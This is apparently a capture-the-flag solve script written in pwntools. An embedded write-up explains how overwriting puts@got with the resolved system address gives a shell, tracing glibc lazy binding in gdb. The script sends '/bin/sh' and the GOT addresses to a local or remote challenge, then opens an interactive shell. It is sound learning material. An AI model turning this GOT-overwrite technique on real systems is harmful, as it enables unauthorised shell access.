from pwn import *
import sys

from_addr = 0x404020  # system@got
to_addr = 0x404018  # puts@got

if len(sys.argv) == 1:
    r = process("./chal")
    gdb.attach(r, "b *0x00000000004012f5\nb _dl_runtime_resolve_xsavec")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)

r.sendlineafter(b"> ", b"/bin/sh\x00")
r.sendafter(b"> ", str(from_addr).encode() + b"\x0a")
r.sendafter(b"> ", str(to_addr).encode() + b"\x0a")
"""
Most writeup didn't explain why we change puts@got to sys@got works? Like [this](https://hackmd.io/@akvo-fajro/scist_final_exam_write_up#email)

I traced the lazy binding procedure with gdb.

If the function has been called then got is it's real address in libc.

For those who haven't been called, got has the address to the gadget 1.

Below is the end of the exploit of this challenge: calling puts -> system@got(address to gadget 1)

Gadget 1 looks like:

0x401040:	endbr64 
0x401044:	push   0x1 <this is some offset>
0x401049:	bnd jmp 0x401020 <this is gadget 2>
0x40104f:	nop

Then the gadget 2:

0x401020:	push   QWORD PTR [rip+0x2fe2]        # 0x404008
0x401026:	bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010
0x40102d:	nop    DWORD PTR [rax]

Then after some `si` we found that it calls `_dl_runtime_resolve_xsavec`

So actually these gadgets are just calling `_dl_runtime_resolve(link_map, offset)`, this function gave us real address to libc function and put it back to got. 

POC:

gdb-peda$ got

/chal:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000403ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
0000000000403ff8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000404060 R_X86_64_COPY     stdout@GLIBC_2.2.5
0000000000404070 R_X86_64_COPY     stdin@GLIBC_2.2.5
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000404020 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
0000000000404028 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404030 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000404038 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0000000000404040 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7
0000000000404048 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5

gdb-peda$ x/wx 0x0000000000404020
0x404020 <system@got[plt]>:	0x4375dd60
gdb-peda$ x/gx 0x0000000000404020
0x404020 <system@got[plt]>:	0x00007f294375dd60
gdb-peda$ x/gx 0x0000000000404018
0x404018 <puts@got[plt]>:	0x0000000000401040
gdb-peda$ xinfo 0x00007f294375dd60
0x7f294375dd60 (<__libc_system>:	endbr64)
Virtual memory mapping:
Start : 0x00007f2943735000
End   : 0x00007f29438ca000
Offset: 0x28d60
Perm  : r-xp
Name  : /usr/lib/x86_64-linux-gnu/libc.so.6

Actually if you disassemble main function, you'll find out this program calls puts at the very end...

"""
r.interactive()
